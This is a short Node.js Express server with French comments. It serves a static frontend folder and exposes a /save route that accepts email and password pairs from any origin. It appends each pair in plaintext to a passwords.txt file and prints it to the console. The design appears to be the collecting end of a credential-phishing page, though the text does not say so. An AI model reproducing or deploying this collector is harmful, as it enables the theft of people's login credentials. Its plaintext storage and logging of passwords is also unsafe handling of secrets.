// Import des modules nécessaires
const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

// Création de l'application Express
const app = express();
const PORT = process.env.PORT || 10000; // IMPORTANT pour Render

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Sert le dossier STOKE (frontend)
app.use(express.static(path.join(__dirname, "..", "STOKE")));

// Chemin du fichier passwords.txt (dans backend/)
const FILE_PATH = path.join(__dirname, "passwords.txt");

// === ROUTE SAVE — Enregistrement des données depuis n’importe quel appareil ===
app.post("/save", (req, res) => {
  const { email, password } = req.body;
if (!email || !password) {
    return res.status(400).send("Email et mot de passe requis");
  }

  const line = `Email: ${email} | Password: ${password}\n`;

  fs.appendFile(FILE_PATH, line, (err) => {
    if (err) {
      console.error("Erreur écriture fichier:", err);
      return res.status(500).send("Impossible d’enregistrer");
    }

    console.log("Nouvelles données enregistrées :", line);
    return res
      .status(200)
      .json({ success: true, message: "Données enregistrées avec succès" });
  });
});

// === Route racine renvoyant index.html ===
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "..", "STOKE", "index.html"));
});

// === Démarrage du serveur ===
app.listen(PORT, () => {
  console.log(`Serveur online sur port ${PORT}`);
});

